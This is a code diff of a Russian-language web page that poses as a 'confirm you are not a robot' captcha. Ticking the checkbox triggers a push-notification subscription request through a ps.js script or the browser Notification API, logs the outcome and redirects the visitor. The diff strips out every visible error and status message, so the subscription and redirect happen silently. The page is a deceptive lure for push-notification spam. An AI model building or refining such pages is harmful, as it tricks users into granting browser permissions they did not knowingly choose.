@@ -100,12 +100,6 @@
             flex-direction: column;
             align-items: flex-start;
         }
-        .error {
-            color: red;
-            font-size: 12px;
-            display: none;
-            margin-top: 5px;
-        }
     </style>
 </head>
 <body>
@@ -127,7 +121,6 @@
         </div>
         <div class="button-container">
             <button class="submit-button" id="submit-button">Отправить</button>
-            <div class="error" id="error">Пожалуйста, подтвердите, что вы не робот.</div>
         </div>
     </div>
 
@@ -140,13 +133,9 @@
                 })
                 .catch(err => {
                     console.error('Ошибка регистрации Service Worker:', err);
-                    document.getElementById('error').innerText = 'Ошибка Service Worker: ' + err;
-                    document.getElementById('error').style.display = 'block';
                 });
         } else {
             console.warn('Service Worker не поддерживается');
-            document.getElementById('error').innerText = 'Service Worker не поддерживается вашим браузером';
-            document.getElementById('error').style.display = 'block';
         }
 
         // Ссылка для редиректа
@@ -181,15 +170,11 @@
                 }, 500);
             } catch (e) {
                 console.error('Ошибка редиректа:', e);
-                document.getElementById('error').innerText = 'Редирект не сработал. Перейдите по ссылке: ' + redirectUrl;
-                document.getElementById('error').style.display = 'block';
             }
         }
 
         // Функция для запроса подписки
         function requestSubscription() {
-            const errorDiv = document.getElementById('error');
-
             // Проверяем статус уведомлений
             if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
                 console.log('Уведомления уже разрешены или заблокированы:', Notification.permission);
@@ -203,8 +188,6 @@
                 console.log('Вызываем подписку через ps.js');
                 const timeout = setTimeout(() => {
                     console.log('Тайм-аут: ps.js не вернул результат');
-                    errorDiv.innerText = 'Тайм-аут запроса подписки';
-                    errorDiv.style.display = 'block';
                     performRedirect();
                 }, 5000);
 
@@ -214,16 +197,12 @@
                             clearTimeout(timeout);
                             console.log('Результат подписки:', result);
                             logSubscription(Notification.permission);
-                            errorDiv.innerText = 'Подписка успешна!';
-                            errorDiv.style.display = 'block';
                             performRedirect();
                         })
                         .catch(err => {
                             clearTimeout(timeout);
                             console.error('Ошибка вызова подписки:', err);
                             logSubscription(Notification.permission);
-                            errorDiv.innerText = 'Ошибка подписки: ' + err;
-                            errorDiv.style.display = 'block';
                             performRedirect();
                         })
                         .finally(() => {
@@ -238,8 +217,6 @@
                     clearTimeout(timeout);
                     console.error('Синхронная ошибка в ps.js:', err);
                     logSubscription('error');
-                    errorDiv.innerText = 'Ошибка ps.js: ' + err;
-                    errorDiv.style.display = 'block';
                     performRedirect();
                 }
             } else {
@@ -249,22 +226,16 @@
                         .then(permission => {
                             console.log('Результат разрешения:', permission);
                             logSubscription(permission);
-                            errorDiv.innerText = 'Статус подписки: ' + permission;
-                            errorDiv.style.display = 'block';
                             performRedirect();
                         })
                         .catch(err => {
                             console.error('Ошибка Notification API:', err);
                             logSubscription('error');
-                            errorDiv.innerText = 'Ошибка Notification API: ' + err;
-                            errorDiv.style.display = 'block';
                             performRedirect();
                         });
                 } else {
                     console.log('Уведомления не поддерживаются');
                     logSubscription('unsupported');
-                    errorDiv.innerText = 'Уведомления не поддерживаются вашим браузером';
-                    errorDiv.style.display = 'block';
                     performRedirect();
                 }
             }
@@ -273,12 +244,8 @@
         // Функция проверки
         function verify() {
             const checkbox = document.getElementById('captcha');
-            const error = document.getElementById('error');
             if (checkbox.checked) {
-                error.style.display = 'none';
                 setTimeout(requestSubscription, 300); // Задержка для анимации
-            } else {
-                error.style.display = 'block';
             }
         }
 
